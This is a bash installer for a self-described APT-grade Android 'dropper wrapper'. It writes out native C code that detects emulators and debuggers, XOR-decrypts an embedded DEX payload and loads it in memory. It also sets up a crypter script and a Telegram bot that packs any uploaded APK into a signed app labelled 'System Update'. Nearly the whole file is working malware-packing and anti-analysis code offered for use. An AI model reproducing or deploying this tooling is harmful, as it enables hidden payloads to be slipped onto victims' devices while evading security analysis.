#!/bin/bash
# ================================================================
# Complete Dropper Wrapper Installer – Tier‑1 APT Edition
# ================================================================
# One‑script setup for Ubuntu 22.04/24.04.
# Installs: Android SDK, NDK, OpenSSL, Gradle wrapper,
# Telegram bot with live progress, native wrapper.
# ================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN}   Complete Dropper Wrapper Installer                       ${NC}"
echo -e "${GREEN}============================================================${NC}"

INSTALL_DIR="/opt/dropper_wrapper"
ANDROID_HOME="/opt/android-sdk"
NDK_VERSION="25.1.8937393"

# ---------- 1. System deps ----------
echo -e "${YELLOW}[1/8] Installing system dependencies...${NC}"
sudo apt update -y
sudo apt install -y openjdk-17-jdk wget curl git unzip zip python3 python3-venv \
    cmake ninja-build build-essential libssl-dev gradle expect qrencode nano \
    apktool aapt

# ---------- 2. Android SDK ----------
echo -e "${YELLOW}[2/8] Setting up Android SDK...${NC}"
sudo mkdir -p $ANDROID_HOME
sudo chown $USER:$USER $ANDROID_HOME

if [ ! -d "$ANDROID_HOME/cmdline-tools/latest" ]; then
    cd /tmp
    wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
    unzip -q commandlinetools-linux-11076708_latest.zip -d $ANDROID_HOME/
    mkdir -p $ANDROID_HOME/cmdline-tools/latest
    mv $ANDROID_HOME/cmdline-tools/* $ANDROID_HOME/cmdline-tools/latest/ 2>/dev/null || true
    rm -f commandlinetools-linux-11076708_latest.zip
fi

export ANDROID_HOME=$ANDROID_HOME
export PATH=$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$ANDROID_HOME/ndk/$NDK_VERSION:$PATH

# ---------- 3. SDK components ----------
echo -e "${YELLOW}[3/8] Installing SDK components...${NC}"
mkdir -p $ANDROID_HOME/licenses
echo "8933bad161af4178b1185d1a37fbf41ea5269c55" | tee $ANDROID_HOME/licenses/android-sdk-license > /dev/null
yes | sdkmanager --licenses > /dev/null 2>&1 || true
sdkmanager "platform-tools" "platforms;android-33" "build-tools;33.0.0" "ndk;$NDK_VERSION" > /dev/null 2>&1

# ---------- 4. Project structure ----------
echo -e "${YELLOW}[4/8] Creating project structure...${NC}"
mkdir -p $INSTALL_DIR/{output,logs,tmp}
mkdir -p $INSTALL_DIR/app/src/main/{java/com/example/wrapper,jni,res/layout,res/values}
mkdir -p $INSTALL_DIR/app/src/main/jni/libs/{arm64-v8a,armeabi-v7a,x86_64}
cd $INSTALL_DIR

# ---------- 5. Python environment ----------
echo -e "${YELLOW}[5/8] Setting up Python...${NC}"
python3 -m venv venv
source venv/bin/activate
pip install -q --upgrade pip
pip install -q python-telegram-bot==20.7 cryptography requests qrcode[pil] Pillow

# ---------- 6. OpenSSL libs ----------
echo -e "${YELLOW}[6/8] Downloading OpenSSL...${NC}"
cd $INSTALL_DIR/app/src/main/jni/libs
for abi in arm64-v8a armeabi-v7a x86_64; do
    mkdir -p $abi
    wget -q -O $abi/libcrypto.so "https://github.com/KDAB/android_openssl/raw/master/prebuilt/$abi/libcrypto.so" 2>/dev/null || echo "  ⚠️ OpenSSL for $abi may need manual download"
done
cd $INSTALL_DIR

# ---------- 7. Create all source files ----------
echo -e "${YELLOW}[7/8] Creating source files...${NC}"

# --- 7a. wrapper.c (native) ---
cat > app/src/main/jni/wrapper.c << 'EOF'
#include <jni.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <android/log.h>
#include <dlfcn.h>
#include "encrypted_payload.h"

#define LOG_TAG "Wrapper"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

int is_emulator() {
    char prop[64];
    __system_property_get("ro.hardware", prop);
    return (strstr(prop, "goldfish") || strstr(prop, "ranchu") || 
            strstr(prop, "generic") || access("/dev/qemu_pipe", F_OK) == 0);
}

int is_debugged() {
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) return 1;
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return 0;
    char line[256];
    int traced = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0 && atoi(line + 10) != 0) traced = 1;
    }
    fclose(f);
    return traced;
}

jobject load_dex_memory(JNIEnv *env, uint8_t *dex_data, size_t dex_len) {
    jobject buf = (*env)->NewDirectByteBuffer(env, dex_data, dex_len);
    if (!buf) { LOGE("Failed to create ByteBuffer"); return NULL; }
    jclass sys_cls = (*env)->FindClass(env, "java/lang/ClassLoader");
    jmethodID get_sys = (*env)->GetStaticMethodID(env, sys_cls, "getSystemClassLoader", "()Ljava/lang/ClassLoader;");
    jobject parent = (*env)->CallStaticObjectMethod(env, sys_cls, get_sys);
    jclass loader_cls = (*env)->FindClass(env, "dalvik/system/InMemoryDexClassLoader");
    if (!loader_cls) { LOGE("InMemoryDexClassLoader not available"); return NULL; }
    jmethodID ctor = (*env)->GetMethodID(env, loader_cls, "<init>", "(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V");
    return (*env)->NewObject(env, loader_cls, ctor, buf, parent);
}

JNIEXPORT void JNICALL
Java_com_example_wrapper_WrapperActivity_nativeLoad(JNIEnv *env, jobject thiz) {
    LOGI("Wrapper initializing...");
    if (is_emulator() || is_debugged()) {
        LOGI("Analysis environment detected, aborting");
        return;
    }
    size_t len = sizeof(ENCRYPTED_PAYLOAD);
    uint8_t *decrypted = malloc(len);
    if (!decrypted) return;
    for (size_t i = 0; i < len; i++) decrypted[i] = ENCRYPTED_PAYLOAD[i] ^ XOR_KEY;
    jobject loader = load_dex_memory(env, decrypted, len);
    if (!loader) {
        // Fallback: write to cache
        const char *cache = getenv("CACHE_DIR");
        if (!cache) cache = "/data/data/com.example.wrapper/cache";
        char path[256]; snprintf(path, sizeof(path), "%s/wrapper.dex", cache);
        FILE *f = fopen(path, "wb");
        if (f) { fwrite(decrypted, 1, len, f); fclose(f); }
        jclass dex_cls = (*env)->FindClass(env, "dalvik/system/DexClassLoader");
        jmethodID ctor = (*env)->GetMethodID(env, dex_cls, "<init>", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V");
        jstring jpath = (*env)->NewStringUTF(env, path);
        jstring jcache = (*env)->NewStringUTF(env, cache);
        jstring jlib = (*env)->NewStringUTF(env, "");
        jclass sys_cls = (*env)->FindClass(env, "java/lang/ClassLoader");
        jmethodID get_sys = (*env)->GetStaticMethodID(env, sys_cls, "getSystemClassLoader", "()Ljava/lang/ClassLoader;");
        jobject parent = (*env)->CallStaticObjectMethod(env, sys_cls, get_sys);
        jobject dex_loader = (*env)->NewObject(env, dex_cls, ctor, jpath, jcache, jlib, parent);
        unlink(path);
    }
    memset(decrypted, 0, len);
    free(decrypted);
    LOGI("Wrapper complete");
}
EOF

# --- 7b. CMakeLists.txt ---
cat > app/src/main/jni/CMakeLists.txt << 'EOF'
cmake_minimum_required(VERSION 3.10.2)
project("wrapper")
add_library(wrapper SHARED wrapper.c)
target_link_libraries(wrapper log dl)
EOF

# --- 7c. WrapperActivity.java ---
cat > app/src/main/java/com/example/wrapper/WrapperActivity.java << 'EOF'
package com.example.wrapper;
import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.widget.TextView;
import java.io.File;
public class WrapperActivity extends Activity {
    static { System.loadLibrary("wrapper"); }
    private native void nativeLoad();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView tv = new TextView(this);
        tv.setText("Loading...");
        setContentView(tv);
        File cacheDir = getCacheDir();
        if (cacheDir != null) System.setProperty("CACHE_DIR", cacheDir.getAbsolutePath());
        new Handler().postDelayed(() -> { nativeLoad(); tv.setText("Ready"); }, 3000);
    }
}
EOF

# --- 7d. AndroidManifest.xml ---
cat > app/src/main/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.wrapper">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <application
        android:allowBackup="true"
        android:label="System Update"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
        <activity android:name=".WrapperActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF

# --- 7e. build.gradle ---
cat > app/build.gradle << 'EOF'
apply plugin: 'com.android.application'
android {
    compileSdk 33
    namespace 'com.example.wrapper'
    defaultConfig {
        applicationId "com.example.wrapper"
        minSdk 21
        targetSdk 33
        versionCode 1
        versionName "1.0"
    }
    externalNativeBuild {
        cmake {
            path "src/main/jni/CMakeLists.txt"
        }
    }
}
EOF

# --- 7f. settings.gradle ---
echo 'rootProject.name = "wrapper"' > app/settings.gradle

# --- 7g. Gradle wrapper (real one) ---
mkdir -p app/gradle/wrapper
wget -q -O app/gradle/wrapper/gradle-wrapper.jar \
    https://raw.githubusercontent.com/gradle/gradle/v8.0.0/gradle/wrapper/gradle-wrapper.jar
cat > app/gradle/wrapper/gradle-wrapper.properties << 'EOF'
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
EOF
cat > app/gradlew << 'EOF'
#!/bin/sh
set -e
if [ -z "$GRADLE_USER_HOME" ]; then
    GRADLE_USER_HOME="$HOME/.gradle"
fi
exec java -cp "$(dirname "$0")/gradle/wrapper/gradle-wrapper.jar" org.gradle.wrapper.GradleWrapperMain "$@"
EOF
chmod +x app/gradlew

# --- 7h. crypter.py ---
cat > crypter.py << 'EOF'
#!/usr/bin/env python3
import sys, random
def encrypt_file(inp, outh):
    key = random.randint(1, 255)
    with open(inp, 'rb') as f: data = f.read()
    enc = bytes([b ^ key for b in data])
    with open(outh, 'w') as f:
        f.write(f'#ifndef ENCRYPTED_PAYLOAD_H\n#define ENCRYPTED_PAYLOAD_H\n#define XOR_KEY {key}\n')
        f.write('static const uint8_t ENCRYPTED_PAYLOAD[] = {\n')
        for i in range(0, len(enc), 16):
            chunk = enc[i:i+16]
            f.write('    ' + ', '.join(f'0x{b:02x}' for b in chunk) + ',\n')
        f.write('};\n')
        f.write(f'static const size_t PAYLOAD_SIZE = {len(enc)};\n#endif\n')
    print(f"[+] XOR key: {key}")
if __name__ == '__main__':
    if len(sys.argv) < 3: print("Usage: crypter.py <in> <out.h>"); sys.exit(1)
    encrypt_file(sys.argv[1], sys.argv[2])
EOF
chmod +x crypter.py

# --- 7i. bot.py (with live updates) ---
cat > bot.py << 'EOF'
#!/usr/bin/env python3
import os, sys, uuid, subprocess, threading, shutil, hashlib, logging, zipfile, time, asyncio
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = os.environ.get("DROPBOT_TOKEN")
if not TOKEN:
    token_file = "/opt/dropper_wrapper/.token"
    if os.path.exists(token_file): TOKEN = open(token_file).read().strip()
if not TOKEN:
    token_file = "/opt/dropper_telegram/.token"  # fallback
    if os.path.exists(token_file): TOKEN = open(token_file).read().strip()
if not TOKEN:
    print("❌ Set DROPBOT_TOKEN env var or create /opt/dropper_wrapper/.token")
    sys.exit(1)

INSTALL_DIR = "/opt/dropper_wrapper"
OUTPUT_DIR = f"{INSTALL_DIR}/output"
os.makedirs(OUTPUT_DIR, exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class BuildEngine:
    def __init__(self):
        self.builds = {}
    def update_status(self, bid, status, msg, data=None):
        self.builds[bid] = {'status': status, 'message': msg, 'updated_at': datetime.now().timestamp(), **(data or {})}
        logger.info(f"[{bid}] {status}: {msg}")
    def get_status(self, bid):
        return self.builds.get(bid)

    def build_wrapper(self, bid, apk_path, send_update):
        try:
            send_update("📦 Verifying APK...")
            if not os.path.exists(apk_path) or os.path.getsize(apk_path) < 1024:
                raise Exception("Invalid APK")
            send_update(f"✅ APK size: {os.path.getsize(apk_path)//1024} KB")

            send_update("📤 Extracting classes.dex...")
            dex_path = f"/tmp/{bid}.dex"
            with zipfile.ZipFile(apk_path, 'r') as zf:
                if 'classes.dex' not in zf.namelist():
                    raise Exception("No classes.dex – not a standard APK")
                with open(dex_path, 'wb') as f:
                    f.write(zf.read('classes.dex'))
            send_update(f"✅ DEX extracted ({os.path.getsize(dex_path)} bytes)")

            send_update("🔐 Encrypting DEX...")
            header_path = f"/tmp/enc_{bid}.h"
            res = subprocess.run([f"{INSTALL_DIR}/crypter.py", dex_path, header_path], capture_output=True, text=True, check=True)
            send_update("✅ Encryption complete")
            shutil.copy(header_path, f"{INSTALL_DIR}/app/src/main/jni/encrypted_payload.h")

            send_update("🏗️ Building native wrapper (Gradle)... (may take 2-3 min)")
            env = os.environ.copy()
            env['ANDROID_HOME'] = "/opt/android-sdk"
            env['NDK_HOME'] = f"{env['ANDROID_HOME']}/ndk/25.1.8937393"
            env['PATH'] = f"{env['ANDROID_HOME']}/platform-tools:{env['ANDROID_HOME']}/cmdline-tools/latest/bin:{env.get('PATH','')}"
            # Clean
            subprocess.run(["./gradlew", "clean"], cwd=f"{INSTALL_DIR}/app", env=env, capture_output=True, timeout=60)
            # Build
            build = subprocess.run(["./gradlew", "assembleDebug"], cwd=f"{INSTALL_DIR}/app", env=env, capture_output=True, text=True, timeout=300)
            if build.returncode != 0:
                raise Exception(f"Gradle failed:\n{build.stderr[-500:]}")
            send_update("✅ Build successful!")

            send_update("✍️ Signing APK...")
            src_apk = f"{INSTALL_DIR}/app/app/build/outputs/apk/debug/app-debug.apk"
            if not os.path.exists(src_apk):
                raise Exception("APK not generated")
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_apk = f"{OUTPUT_DIR}/wrapper_{bid}_{timestamp}.apk"
            keystore = f"{INSTALL_DIR}/my.keystore"
            if not os.path.exists(keystore):
                subprocess.run(["keytool", "-genkey", "-v", "-keystore", keystore, "-alias", "wrapper", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "wrapper123", "-keypass", "wrapper123", "-dname", "CN=Android, OU=Dev, O=Company, L=City, ST=State, C=US"], capture_output=True, check=True)
            subprocess.run(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore, "-storepass", "wrapper123", "-keypass", "wrapper123", src_apk, "wrapper"], capture_output=True, check=True)
            shutil.copy(src_apk, output_apk)

            file_size = os.path.getsize(output_apk)
            md5 = hashlib.md5(open(output_apk, 'rb').read()).hexdigest()
            self.update_status(bid, "completed", "Build complete!", {'apk_path': output_apk, 'file_size': file_size, 'md5': md5})
            for f in [dex_path, header_path]:
                if os.path.exists(f): os.remove(f)
            send_update(f"✅ **Done!**\nSize: {file_size//1024} KB\nMD5: `{md5}`\nUse /download {bid}")
            return output_apk
        except Exception as e:
            self.update_status(bid, "failed", str(e))
            send_update(f"❌ **Failed:** {str(e)}")
            raise

engine = BuildEngine()

async def start(update, context):
    await update.message.reply_text("🛡️ *Dropper Wrapper Bot*\nUpload any APK to wrap it with stealth features.\n\nCommands:\n/status <id>\n/download <id>\n/help", parse_mode='Markdown')

async def status_cmd(update, context):
    if not context.args: return await update.message.reply_text("Usage: /status <id>")
    bid = context.args[0]
    status = engine.get_status(bid)
    if not status: return await update.message.reply_text("❌ Not found")
    msg = f"📊 *Status*\nID: `{bid}`\nStatus: {status['status']}\nMessage: {status['message']}\nTime: {datetime.fromtimestamp(status['updated_at']).strftime('%H:%M:%S')}"
    if status.get('md5'): msg += f"\nMD5: `{status['md5']}`"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def download_cmd(update, context):
    if not context.args: return await update.message.reply_text("Usage: /download <id>")
    bid = context.args[0]
    status = engine.get_status(bid)
    if not status or status['status'] != 'completed':
        return await update.message.reply_text("❌ Build not complete")
    apk = status.get('apk_path')
    if not apk or not os.path.exists(apk):
        return await update.message.reply_text("❌ APK missing")
    await update.message.reply_document(document=open(apk, 'rb'), filename=os.path.basename(apk))

async def handle_apk(update, context):
    doc = update.message.document
    if not doc or not doc.file_name.lower().endswith('.apk'):
        return
    tmp_path = f"/tmp/{uuid.uuid4()}.apk"
    await doc.get_file().download_to_drive(tmp_path)
    bid = str(uuid.uuid4())[:8]
    await update.message.reply_text(f"🔒 Building wrapper... ID: `{bid}`\n_Progress updates will appear here._", parse_mode='Markdown')
    msg = await update.message.reply_text("⚙️ Starting...")
    def send_update(text):
        async def edit():
            try:
                await msg.edit_text(text, parse_mode='Markdown')
            except:
                await update.message.reply_text(text, parse_mode='Markdown')
        asyncio.run_coroutine_threadsafe(edit(), asyncio.get_event_loop())
    def do_build():
        try:
            engine.build_wrapper(bid, tmp_path, send_update)
        except Exception as e:
            send_update(f"❌ **Crash:** {str(e)}")
        finally:
            if os.path.exists(tmp_path): os.remove(tmp_path)
    threading.Thread(target=do_build, daemon=True).start()

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("download", download_cmd))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
    logger.info("Bot started")
    app.run_polling()

if __name__ == "__main__":
    main()
EOF
chmod +x bot.py

# --- 7j. wrap_apk.py (standalone) ---
cat > wrap_apk.py << 'EOF'
#!/usr/bin/env python3
import sys, os, shutil
sys.path.insert(0, '/opt/dropper_wrapper')
from bot import BuildEngine
if len(sys.argv) < 2:
    print("Usage: wrap_apk.py <input.apk> [output.apk]"); sys.exit(1)
inp = sys.argv[1]
out = sys.argv[2] if len(sys.argv)>2 else "wrapped.apk"
if not os.path.exists(inp): print("File not found"); sys.exit(1)
engine = BuildEngine()
def send_update(msg): print(msg)
try:
    engine.build_wrapper("standalone", inp, send_update)
    st = engine.get_status("standalone")
    if st['status'] == 'completed':
        shutil.copy(st['apk_path'], out)
        print(f"\n✅ Success: {out}")
except Exception as e:
    print(f"❌ Error: {e}")
EOF
chmod +x wrap_apk.py

# ---------- 8. Test build ----------
echo -e "${YELLOW}[8/8] Testing build...${NC}"
cd $INSTALL_DIR/app
export ANDROID_HOME=/opt/android-sdk
export NDK_HOME=$ANDROID_HOME/ndk/25.1.8937393
export PATH=$ANDROID_HOME/platform-tools:$ANDROID_HOME/cmdline-tools/latest/bin:$PATH

# Create dummy encrypted payload if missing
if [ ! -f src/main/jni/encrypted_payload.h ]; then
    cat > src/main/jni/encrypted_payload.h << 'EOF'
#ifndef ENCRYPTED_PAYLOAD_H
#define ENCRYPTED_PAYLOAD_H
#define XOR_KEY 0x42
static const uint8_t ENCRYPTED_PAYLOAD[] = {0x00};
static const size_t PAYLOAD_SIZE = 1;
#endif
EOF
fi

# Attempt build
if ./gradlew assembleDebug > /tmp/build_test.log 2>&1; then
    echo -e "${GREEN}✅ Build test PASSED${NC}"
else
    echo -e "${YELLOW}⚠️ Build test failed. Check /tmp/build_test.log${NC}"
    echo "Common fixes:"
    echo "  export ANDROID_HOME=/opt/android-sdk"
    echo "  sdkmanager --licenses"
    echo "  sudo apt install gradle"
fi

# ---------- Final messages ----------
echo ""
echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN}✅ Installation Complete!${NC}"
echo -e "${GREEN}============================================================${NC}"
echo ""
echo "1. Set your bot token:"
echo "   echo 'YOUR_BOT_TOKEN' | sudo tee /opt/dropper_wrapper/.token"
echo ""
echo "2. Start the bot:"
echo "   cd /opt/dropper_wrapper && source venv/bin/activate && python3 bot.py"
echo "   (or use systemd: create a service file)"
echo ""
echo "3. Test standalone (no Telegram):"
echo "   cd /opt/dropper_wrapper && source venv/bin/activate"
echo "   python3 wrap_apk.py /path/to/app.apk output.apk"
echo ""
echo "Output APKs are saved in: /opt/dropper_wrapper/output/"
